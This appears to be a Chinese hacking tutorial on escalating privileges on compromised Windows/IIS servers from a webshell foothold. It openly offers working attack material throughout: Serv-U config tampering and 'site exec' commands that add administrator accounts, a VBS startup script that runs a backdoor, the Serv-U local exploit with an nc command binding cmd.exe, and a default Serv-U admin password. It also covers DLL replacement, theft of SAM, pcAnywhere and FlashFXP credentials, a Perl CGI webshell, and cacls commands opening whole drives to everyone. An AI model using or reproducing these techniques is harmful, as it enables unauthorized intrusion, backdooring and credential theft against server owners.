@@ -1,0 +1,226 @@
+servu提权 
+一. servu提权 
+
+
+①
+好开始把，首先通过webshell访问servu安装文件夹下的ServUDaemon.ini把他下载
+下来，然后在本机上安装一个servu把ServUDaemon.ini放到本地安装文件夹下覆盖，
+启动servu添加了一个用户，设置为系统管理员，目录C:\，具有可执行权限
+然后去servu安装目录里把ServUDaemon.ini更换服务器上的。
+用我新建的用户和密码连接～
+好的，还是连上了
+ftp
+ftp>open ip 
+Connected to ip.
+220 Serv-U FTP Server v5.0.0.4 for WinSock ready...
+User (ip:(none)): id           //刚才添加的用户
+331 User name okay, please send complete E-mail address as password.
+Password:password           //密码
+230 User logged in, proceed.
+ftp> cd winnt             //进入win2k的winnt目录
+250 Directory changed to /WINNT
+ftp>cd system32             //进入system32目录
+250 Directory changed to /WINNT/system32
+ftp>quote site exec net.exe user rover rover1234 /add //利用系统的net.exe
+文件加用户。
+如果提示没有权限，那我们就
+把后门（server.exe） 传他system32目录
+然后写一个VBs教本
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+set wshshell=createobject ("wscript.shell") 
+a=wshshell.run ("cmd.exe /c net user user pass /add",0) 
+b=wshshell.run ("cmd.exe /c net localgroup Administrators user /add",0)
+b=wshshell.run ("cmd.exe /c server.exe",0)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+存为xx.vbe
+这个教本的作用是建立user用户密码为pass
+并且提升为管理员
+然后执行system32目录下的server.exe
+把这个教本传他 C:\Documents and Settings\All Users\「开始」菜单\程序\启动
+目录
+
+②
+Serv-u Ftp Server 本地权限提升漏洞：
+很多主机的C:\Documents and Settings\All Users\ Documents目录以
+及下边几个子目录Documents没有设置权限，导致可以在这个目录上传并
+运行Exp.
+直接上传了serv-u local exploit 和nc,
+并且把serv-u的本地提升权限的名字命名为su.exe 
+文件就放在C:\Documents and Settings\All Users\ Documents,
+然后我们用su.exe直接建立用户,也可以反弹一个shell过来的。
+具体命令：
+建立用户: serv-u.exe "cmd" 
+>USER xl
+>PASS 111111
+反弹shell: serv-u.exe "nc.exe -l -p 99 -e cmd.exe"
+
+③
+OK，看看他的PROGRAME里面有些什么程序，哦，有SERV-U，记得有次看到SERV-U有默认的用户名和密码，但是监听的端口是43958，而且是只有本地才能访问的，但是我们有端口转发工具的啊，不怕。先看看他的SERV-U的版本是多少，telnet XXX.XXX.XXX.XXX 21
+显示竟然是3.0的，唉，不得不说这个管理员真的不称职。后来完毕后扫描了下，也只有FTP的洞没有补。既然是这样，我们就开始我们的提升权限了
+上传FPIPE，端口转发工具， 图三
+在运行CMD命令里输入d:\wwwroot\fpipe.exe -v -l 81 -r 43958 127.0.0.1 意思是把本机的43598端口转发到81端口
+然后打开我们自己机子上的SERV-U，点Serv－U服务器，点菜单栏上的的服务器，点新建服务器，然后输入IP，输入端口，记得端口是刚刚我们转发的81端口。服务名称随便你喜欢，怎么样都行。然后是用户名：LocalAdministrator 密码：#l@$ak#.lk;0@P   (密码都是字母) 
+确定，然后点刚刚建的服务器，然后就可以看到已有的用户，自己新建一个用户，把所有权限加上。也不锁定根目录
+接下来就是登陆了，登陆FTP一定要在CMD下登陆，
+进入后一般命令和DOS一样，添加用户的时候
+ftp>quote site exec net.exe user hk pass /add
+ftp>quote site exec net.exe localgroup administrators hk/add
+如果对方开了3389的话，就不用我教你怎么做了，没开的话，新建立IPC连接，在上传木马或者是开启3389的工具
+
+
+           二.替换
+①
+就是先检查有什么系统服务，或者随系统启动自动启动的程序和管理员经常使用的软件，
+比如诺顿，VAdministrator，金山，瑞星,WinRAR甚至QQ之类的，是否可以写，如果可以就修改其程序，
+绑定一个批处理或者VBS，然后还是等待服务器重启。
+
+②
+WIN2K+IIS5.0默认情况下应用程序保护选项是"中（共用的）"，这时IIS加载isapi是用的
+iwam_computername用户身份执行。
+但默认情况下WIN2K+IIS5对于一些特殊isapi又要以system身份加载。win2k+iis5 、
+win2k+iis5+sp1、win2k+iis5+sp2都是简单的判断isapi的文件名，并且没有做目录限制，
+以SYSTEM权限加载的isapi有：
+1、 idq.dll
+2、 httpext.dll
+3、 httpodbc.dll
+4、 ssinc.dll
+5、 msw3prt.dll
+6、 author.dll
+7、 admin.dll
+8、 shtml.dll
+9、 sspifilt.dll
+10、compfilt.dll
+11、pwsdata.dll
+12、md5filt.dll
+13、fpexedll.dll
+
+所以利用这很容易得到SYSTEM权限。并且判断文件名的时候有个bug，比如请求/scripts/test
+%81%5cssinc.dll也将会认为是请求的ssinc.dll,就是分离文件路径的时候没有考虑到双字节的
+远东版问题。ssinc.dll在处理包含文件路径的时候也有一个问题，就是"/"、"\"只识别了一个
+"/"，所以如果请求里面使用"\"，就会错误的处理包含文件路径，有可能泄露东西或者出现权限
+漏洞，这种漏洞很多别的地方（ php、asp等）也还存在。
+加载这些isapi不是单以文件名做依据了，而是加了路径，应该是修正了此问题。
+一般默认情况下是：
+1、 idq.dll       d:\winnt\system32\idq.dll
+2、 httpext.dll     d:\winnt\system32\inetsrv\httpext.dll
+3、 httpodbc.dll   d:\winnt\system32\inetsrv\httpodbc.dll
+4、 ssinc.dll     d:\winnt\system32\inrtsrv\ssinc.dll
+5、 msw3prt.dll     d:\winnt\system32\msw3prt.dll
+6、 author.dll     D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\_vti_aut\author.dll
+7、 admin.dll     D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\_vti_adm\admin.dll
+8、 shtml.dll     D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\isapi\shtml.dll
+9、 sspifilt.dll   d:\winnt\system32\inetsrv\sspifilt.dll
+10、compfilt.dll   d:\winnt\system32\inetsrv\compfilt.dll
+11、pwsdata.dll     d:\winnt\system32\inetsrv\pwsdata.dll
+12、md5filt.dll     d:\winnt\system32\inetsrv\md5filt.dll
+13、fpexedll.dll   D:\Program Files\Common Files\Microsoft Shared\web server extensions\40\bin\fpexedll.dll
+正常情况下这些路径都guest不能写,但如果配置不好，这些路径iis user能够写了就一样可以提升权限了
+可以把ISAPIHack.dll(直接搜索就有的下载了)上传到IIS的可执行目录，文件名可叫ssinc.dll或者admin.dll等（上面列的13个文件名之一）。
+然后等待IIS重启加载此dll，就可以获得权限了
+
+③
+替换法，可以替换正在执行的文件。用这个几乎可以马上得到权限，但是我没有做过试验，可以试下，将对方正在执行的文件替换为和它文件名一样的，捆绑了木马的。为什么不直接替换木马呢？如果替换的是关键程序，那不是就直接挂了？所以还是捆绑好点
+格式 
+REPLACE [drive1:][path1]filename [drive2:][path2] [/A] 
+[/R] [/W] 
+REPLACE [drive1:][path1]filename [drive2:][path2] 
+
+[/R] [/S] [/W] 
+
+　[drive1:][path1]filename 指定源文件。 
+　[drive2:][path2] 指定要替换文件的目录。 
+　　　　　　　　　　　　　 
+　/A 把新文件加入目标目录。不能和 
+　　　　　　　　　　　　　 /S 或 /U 命令行开关搭配使用。 
+　/P 替换文件或加入源文件之前会先提示您 
+　　　　　　　　　　　　　 进行确认。 
+　/R 替换只读文件以及未受保护的 
+　　　　　　　　　　　　　 文件。 
+　/S 替换目标目录中所有子目录的文件。 
+　　　　　　　　　　　　　 不能与 /A 命令选项 
+　　　　　　　　　　　　　 搭配使用。 
+　/W 等您插入磁盘以后再运行。 
+　/U 只会替换或更新比源文件日期早的文件。 
+　　　　　　　　　　　　　 不能与 /A 命令行开关搭配使用
+这个命令没有试验过，看能不能替换不能访问的文件夹下的文件，大家可以试验下
+
+           三. 找密码文件
+①  
+C:\Documents and Settings\All Users\ApplicationData\Symantec\pcAnywhere\
+看能否跳转到这个目录，如果行那就最好了，直接下它的CIF文件，得到pcAnywhere密码，登陆
+②  
+C:\WINNT\system32\config\
+进这里下它的SAM，用到破解sam密码的软件有LC4，SAMinside
+
+如果可以访问对方的SYSTEM32的话，删除对方的SAM文件，等他重启以后就是ADMIN用户密码为空
+突然又有了想法，可以用REPLACE命令替换的吗，可以把你的SAM文件提取出来，上传到他的任意目录下，然后替换。不过不知道如果对SYSTEM32没有权限访问的话，能不能实现替换
+
+③
+C:\Documents and Settings\All Users\「开始」菜单\程序\\
+看这里能跳转不，我们从这里可以获取好多有用的信息
+可以看见好多快捷方式，我们一般选择Serv-U的，然后本地查看属性，知道路径后，看能否跳转
+进去后，如果有权限修改ServUDaemon.ini，加个用户上去，密码为空
+[USER=WekweN|1]
+Password=
+HomeDir=c:\\
+TimeOut=600
+Maintenance=System
+Access1=C:\|RWAMELCDP
+Access1=d:\|RWAMELCDP
+Access1=f:\|RWAMELCDP
+SKEYValues=
+这个用户具有最高权限，然后我们就可以ftp上去 quote site exec xxx 来提升权限
+④
+使用Flashfxp也能提升权限，但是成功率就看你自己的运气了
+首先找到FlashFXP文件夹，打开(编辑)Sites. dat，这个文件这是什么东西密码和用户名，
+而且密码是加了密的。
+如果我把这些文件copy回本地也就是我的计算机中，替换我本地的相应文件。然后会发现
+打开flashfxp在站点中打开站点管理器一样。又可以添加N多肉鸡啦～～嘻嘻～
+唔？？不对啊，是来提升权限的啊，晕，接着来别半途而废。大家看看对方管理员的这站点管理器，有用户名和密码，密码是星号的。经过用xp星号密码
+查看器查看，然后和Sites.dat中加密了密码做比较发现并未加密而是查到的密码是明文显示，
+然后最终把这个网站管理员的密码从这堆东西中找
+出来。那么下一步就可以链接这些新的服务器啦～～
+经过测试只要把含有密码和用户名的Sites.dat文件替换到本地相应的文件就可以在本地还原对方管理员的各个站点的密码。
+
+         四.   利用有价值的目录
+        
+看能否跳转到如下目录
+c:\php, 用phpspy
+c:\prel，有时候不一定是这个目录(同样可以通过下载快捷方式看属性获知)用cgi的webshell
+#!/usr/bin/perl
+binmode(STDOUT);
+syswrite(STDOUT, "Content-type: text/html\r\n\r\n", 27);
+$_ = $ENV{QUERY_STRING};
+s/%20/ /ig;
+s/%2f/\//ig;
+$execthis = $_;
+syswrite(STDOUT, "\r\n", 13);
+open(STDERR, ">&STDOUT") || die "Cant redirect STDERR";
+system($execthis);
+syswrite(STDOUT, "\r\n\r\n", 17);
+close(STDERR);
+close(STDOUT);
+exit;
+保存为cgi执行,
+如果不行，可以试试 pl 扩展呢，把刚才的 cgi 文件改为 pl 文件，提交 http://anyhost//cmd.pl?dir 
+显示“拒绝访问”，表示可以执行了！马上提交：先的上传个su.exe(ser-u提升权限的工具)到 prel的bin目录
+http://anyhost//cmd.pl?c\perl\bin\su.exe 
+返回： 
+Serv-u >3.x Local Exploit by xiaolu 
+USAGE: serv-u.exe "command" 
+Example: serv-u.exe "nc.exe -l -p 99 -e cmd.exe" 
+现在是 IUSR 权限，提交： 
+http://anyhost//cmd.pl?c\perl\bin\su.exe "cacls.exe c: /E /T /G everyone:F" 
+http://anyhost//cmd.pl?c\perl\bin\su.exe "cacls.exe d: /E /T /G everyone:F" 
+http://anyhost//cmd.pl?c\perl\bin\su.exe "cacls.exe e: /E /T /G everyone:F" 
+http://anyhost//cmd.pl?c\perl\bin\su.exe "cacls.exe f: /E /T /G everyone:F" 
+如果返回下面的信息，就表示成功了
+Serv-u >3.x Local Exploit by xiaolu 
+USER LocalAdministrator 
+PASS #l@$ak#.lk;0@P 
+SITE MAINTENANCE 
+****************************************************** 
+[+] Creating New Domain... 
+USER xl 
+PASS 111111
+
